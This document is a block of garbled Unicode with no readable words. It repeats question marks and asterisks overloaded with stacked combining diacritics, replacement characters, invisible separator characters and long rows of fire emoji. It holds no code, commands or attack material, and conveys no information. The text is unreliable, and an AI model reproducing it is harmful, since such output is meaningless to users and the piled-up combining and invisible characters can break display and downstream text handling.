̢̯̠͔̟̰͔̞̮̦̫͔̖̦̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̛͛́̿́̕̕